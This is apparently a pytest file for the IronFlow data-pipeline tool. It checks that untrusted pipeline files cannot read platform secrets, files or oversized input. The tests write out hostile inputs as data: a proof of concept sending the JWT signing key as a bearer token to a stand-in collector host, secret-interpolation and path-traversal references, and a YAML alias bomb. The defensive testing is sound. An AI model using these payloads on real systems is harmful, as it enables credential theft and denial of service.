"""What a pipeline file can read: the environment, secret files, and itself.

A pipeline definition is untrusted input.  These tests pin the ways one used to
reach past its own contents:

* ``env:NAME`` and ``${NAME}`` read *any* variable in the process - IronFlow's
  own token-signing and encryption keys included - and a REST sink then carried
  the value to whichever public host the file named;
* ``file:`` read any file the process could open;
* under five hundred bytes of YAML aliases described hundreds of millions of nodes;
* two files declaring one pipeline name took turns running under one identity.
"""

from __future__ import annotations

import time
from pathlib import Path

import pytest

from ironflow.config.loader import (
    MAX_DOCUMENT_BYTES,
    PipelineRepository,
    load_document,
    load_pipeline,
)
from ironflow.config.models import ConnectorSpec, TransformSpec
from ironflow.config.settings import Settings, reset_settings
from ironflow.connectors.factory import ConnectorFactory
from ironflow.core.errors import ConfigurationError, SecretError, SecurityError
from ironflow.core.types import RecordBatch
from ironflow.security.crypto import CryptoService, generate_key
from ironflow.security.secrets import EnvironmentPolicy, SecretResolver
from ironflow.transformation.base import build_transformation

PLATFORM_SECRETS = [
    "IRONFLOW_JWT_SECRET",
    "IRONFLOW_ENCRYPTION_KEY",
    "IRONFLOW_STATE_DATABASE_URL",
    # pydantic-settings reads a lower-case variable as the setting too.
    "ironflow_jwt_secret",
]


def write_pipeline(directory: Path, *, owner: str = "team", name: str = "p") -> Path:
    path = directory / f"{name}-{abs(hash(owner)) % 10_000}.yaml"
    path.write_text(
        f'name: {name}\nowner: "{owner}"\n'
        "variables:\n  region: eu\n"
        "tasks:\n"
        "  - name: t\n"
        "    source: {type: memory, dataset: d}\n"
        "    destination: {type: memory, buffer: b}\n",
        encoding="utf-8",
    )
    return path


class TestEnvironmentReferences:
    @pytest.mark.parametrize("name", PLATFORM_SECRETS)
    def test_ironflows_own_settings_are_never_readable(self, name, monkeypatch):
        monkeypatch.setenv(name, "platform-secret-value")
        with pytest.raises(SecretError, match="own configuration"):
            SecretResolver().resolve(f"env:{name}")

    def test_other_variables_stay_readable_without_an_allow_list(self, monkeypatch):
        monkeypatch.setenv("PGPASSWORD", "db-password")
        assert SecretResolver().reveal("env:PGPASSWORD") == "db-password"

    def test_the_allow_list_bounds_what_a_pipeline_can_name(self, monkeypatch):
        monkeypatch.setenv("PGPASSWORD", "db-password")
        monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "cloud-key")
        resolver = SecretResolver(env_policy=EnvironmentPolicy(allow=["PG*"]))
        assert resolver.reveal("env:PGPASSWORD") == "db-password"
        with pytest.raises(SecretError, match="IRONFLOW_PIPELINE_ENV"):
            resolver.resolve("env:AWS_SECRET_ACCESS_KEY")

    def test_a_platform_setting_is_refused_even_when_allow_listed(self):
        policy = EnvironmentPolicy(allow=["IRONFLOW_*"], deny=["IRONFLOW_JWT_SECRET"])
        with pytest.raises(SecretError, match="own configuration"):
            policy.check("IRONFLOW_JWT_SECRET")


class TestSecretFiles:
    def test_file_references_are_off_until_the_operator_names_a_directory(self, tmp_path):
        key = tmp_path / "id_ed25519"
        key.write_text("-----PRIVATE KEY-----", encoding="utf-8")
        with pytest.raises(SecretError, match="IRONFLOW_SECRET_FILE_ROOTS"):
            SecretResolver().resolve(f"file:{key}")

    def test_a_file_outside_the_roots_is_a_security_error(self, tmp_path):
        (tmp_path / "secrets").mkdir()
        outside = tmp_path / "id_ed25519"
        outside.write_text("-----PRIVATE KEY-----", encoding="utf-8")
        resolver = SecretResolver(file_roots=[tmp_path / "secrets"])
        with pytest.raises(SecurityError, match="IRONFLOW_SECRET_FILE_ROOTS"):
            resolver.resolve(f"file:{outside}")
        with pytest.raises(SecurityError):
            resolver.resolve(f"file:{tmp_path / 'secrets' / '..' / 'id_ed25519'}")

    def test_a_file_inside_them_resolves(self, tmp_path):
        (tmp_path / "secrets").mkdir()
        secret = tmp_path / "secrets" / "db"
        secret.write_text("db-password\n", encoding="utf-8")
        resolver = SecretResolver(file_roots=[tmp_path / "secrets"])
        assert resolver.reveal(f"file:{secret}") == "db-password"


class TestResolverForPipelines:
    def test_it_applies_the_operators_policy(self, tmp_path, monkeypatch):
        settings = Settings(
            home=tmp_path,
            allow_literal_secrets=False,
            pipeline_env="PG*",
            secret_file_roots=[tmp_path],
        )
        resolver = SecretResolver.for_pipelines(settings)
        with pytest.raises(SecretError, match="literal"):
            resolver.resolve("plaintext-password")
        monkeypatch.setenv("API_TOKEN", "token")
        with pytest.raises(SecretError, match="IRONFLOW_PIPELINE_ENV"):
            resolver.resolve("env:API_TOKEN")

    def test_enc_references_decrypt_with_the_platform_key(self, tmp_path):
        """Connectors were built with no key, so a documented ``enc:`` never decrypted."""
        key = generate_key()
        envelope = CryptoService.from_key(key).encrypt("db-password")
        settings = Settings(home=tmp_path, encryption_key=key)
        assert SecretResolver.for_pipelines(settings).reveal(f"enc:{envelope}") == "db-password"
        assert ConnectorFactory(settings).secrets.reveal(f"enc:{envelope}") == "db-password"

    def test_a_malformed_key_fails_only_the_pipeline_that_needs_it(self, tmp_path, monkeypatch):
        resolver = SecretResolver.for_pipelines(
            Settings(home=tmp_path, encryption_key="not-a-fernet-key")
        )
        monkeypatch.setenv("PGPASSWORD", "db-password")
        assert resolver.reveal("env:PGPASSWORD") == "db-password"
        with pytest.raises(ConfigurationError, match="invalid encryption key"):
            resolver.resolve("enc:ironflow:v1:abc")


class TestExfiltrationThroughAConnector:
    """The review's proof of concept, end to end.

    A REST sink whose bearer token was ``env:IRONFLOW_JWT_SECRET`` sent the
    API's signing key to the host the pipeline named, as an ``Authorization``
    header - one YAML file away from forging an admin token.
    """

    def test_the_signing_key_never_leaves_the_process(self, factory, context, monkeypatch):
        monkeypatch.setenv("IRONFLOW_JWT_SECRET", "s" * 40)
        sink = factory.create_sink(
            ConnectorSpec.model_validate(
                {
                    "type": "rest",
                    "url": "https://collector.example.com/",
                    "auth": "bearer",
                    "token": "env:IRONFLOW_JWT_SECRET",
                    "allow_private_network": True,
                }
            )
        )
        with pytest.raises(SecretError, match="own configuration"):
            sink.open(context)

    def test_hash_columns_cannot_borrow_the_encryption_key(self, context, monkeypatch):
        monkeypatch.setenv("IRONFLOW_ENCRYPTION_KEY", generate_key())
        reset_settings()
        transform = build_transformation(
            TransformSpec.model_validate(
                {"type": "hash_columns", "columns": ["email"], "key": "env:IRONFLOW_ENCRYPTION_KEY"}
            )
        )
        with pytest.raises(SecretError, match="own configuration"):
            transform.apply(RecordBatch([{"email": "a@b.com"}]), context)

    def test_hash_columns_honours_the_literal_secret_policy(self, context, monkeypatch):
        """A bare resolver here ignored ``allow_literal_secrets: false``."""
        monkeypatch.setenv("IRONFLOW_ALLOW_LITERAL_SECRETS", "false")
        reset_settings()
        transform = build_transformation(
            TransformSpec.model_validate(
                {"type": "hash_columns", "columns": ["email"], "key": "pepper-in-the-yaml"}
            )
        )
        with pytest.raises(SecretError, match="literal"):
            transform.apply(RecordBatch([{"email": "a@b.com"}]), context)


class TestInterpolation:
    def test_a_pipeline_cannot_interpolate_a_platform_secret(self, tmp_path, monkeypatch):
        """``owner: "${IRONFLOW_JWT_SECRET}"`` used to publish the key on the dashboard."""
        monkeypatch.setenv("IRONFLOW_JWT_SECRET", "s" * 40)
        path = write_pipeline(tmp_path, owner="${IRONFLOW_JWT_SECRET}")
        with pytest.raises(SecretError, match="own configuration"):
            load_pipeline(path, roots=(tmp_path,))

    def test_naming_one_is_refused_even_where_it_is_unset(self, tmp_path):
        path = write_pipeline(tmp_path, owner="${IRONFLOW_ENCRYPTION_KEY:-nobody}")
        with pytest.raises(SecretError, match="own configuration"):
            load_pipeline(path, roots=(tmp_path,))

    def test_the_allow_list_applies_to_interpolation(self, tmp_path, monkeypatch):
        monkeypatch.setenv("REGION", "eu")
        monkeypatch.setenv("DEPLOY_TOKEN", "t0ken")
        policy = EnvironmentPolicy(allow=["REGION"])
        spec = load_pipeline(
            write_pipeline(tmp_path, owner="team-${REGION}"), roots=(tmp_path,), env_policy=policy
        )
        assert spec.owner == "team-eu"
        with pytest.raises(SecretError, match="IRONFLOW_PIPELINE_ENV"):
            load_pipeline(
                write_pipeline(tmp_path, owner="${DEPLOY_TOKEN}"),
                roots=(tmp_path,),
                env_policy=policy,
            )

    def test_pipeline_variables_are_not_the_environment(self, tmp_path):
        spec = load_pipeline(
            write_pipeline(tmp_path, owner="team-${var.region}"),
            roots=(tmp_path,),
            env_policy=EnvironmentPolicy(allow=["NOTHING_AT_ALL"]),
        )
        assert spec.owner == "team-eu"

    def test_the_operators_setting_is_the_default_policy(self, tmp_path, monkeypatch):
        monkeypatch.setenv("IRONFLOW_PIPELINE_ENV", "REGION")
        monkeypatch.setenv("DEPLOY_TOKEN", "t0ken")
        reset_settings()
        with pytest.raises(SecretError, match="IRONFLOW_PIPELINE_ENV"):
            load_pipeline(write_pipeline(tmp_path, owner="${DEPLOY_TOKEN}"), roots=(tmp_path,))


class TestDocumentBounds:
    def test_an_alias_bomb_is_refused_before_it_expands(self, tmp_path):
        """Nine levels of nine aliases: 387 million nodes in under 500 bytes."""
        lines = ["a0: &a0 [x, x, x, x, x, x, x, x, x]"]
        for level in range(1, 9):
            refs = ", ".join([f"*a{level - 1}"] * 9)
            lines.append(f"a{level}: &a{level} [{refs}]")
        path = tmp_path / "bomb.yaml"
        path.write_text("\n".join(lines) + "\nname: bomb\n", encoding="utf-8")
        assert path.stat().st_size < 500

        started = time.perf_counter()
        with pytest.raises(ConfigurationError, match="node limit"):
            load_document(path, roots=(tmp_path,))
        assert time.perf_counter() - started < 5

    def test_a_recursive_alias_is_refused(self, tmp_path):
        path = tmp_path / "loop.yaml"
        path.write_text("name: loop\nloop: &a [*a]\n", encoding="utf-8")
        with pytest.raises(ConfigurationError, match="recursive"):
            load_document(path, roots=(tmp_path,))

    def test_an_oversized_file_is_refused_unread(self, tmp_path):
        path = tmp_path / "huge.yaml"
        path.write_text("name: huge\n# " + "x" * MAX_DOCUMENT_BYTES + "\n", encoding="utf-8")
        with pytest.raises(ConfigurationError, match="too large"):
            load_document(path, roots=(tmp_path,))

    @pytest.mark.parametrize(
        ("suffix", "text"),
        [(".yaml", "x: " + "[" * 5000 + "]" * 5000), (".json", "[" * 100_000 + "]" * 100_000)],
        ids=["yaml", "json"],
    )
    def test_absurd_nesting_is_a_configuration_error_not_a_crash(self, tmp_path, suffix, text):
        path = tmp_path / f"deep{suffix}"
        path.write_text(text, encoding="utf-8")
        with pytest.raises(ConfigurationError):
            load_document(path, roots=(tmp_path,))

    def test_ordinary_anchors_still_work(self, tmp_path):
        path = tmp_path / "anchors.yaml"
        path.write_text(
            "name: anchors\ndefaults: &d {batch_size: 10, retries: 2}\n"
            "task_a: *d\ntask_b: {<<: *d, retries: 5}\n",
            encoding="utf-8",
        )
        document = load_document(path, roots=(tmp_path,))
        assert document["task_a"] == {"batch_size": 10, "retries": 2}
        assert document["task_b"] == {"batch_size": 10, "retries": 5}


class TestDuplicatePipelineNames:
    """Run history, watermarks and the schedule are all keyed by name.

    Two files declaring ``sales_daily`` used to take turns: the scheduler ran the
    last one, a manual run used the first, and each advanced the other's
    watermark - so one team's incremental load silently skipped rows.
    """

    def test_neither_file_is_trusted(self, tmp_path):
        write_pipeline(tmp_path, name="sales_daily", owner="team-a")
        write_pipeline(tmp_path, name="sales_daily", owner="team-b")
        write_pipeline(tmp_path, name="hr_payroll", owner="team-c")
        repository = PipelineRepository(tmp_path)
        with pytest.raises(ConfigurationError, match="more than one file"):
            repository.get("sales_daily")
        assert [spec.name for spec in repository.load_all()] == ["hr_payroll"]
        assert repository.get("hr_payroll").owner == "team-c"
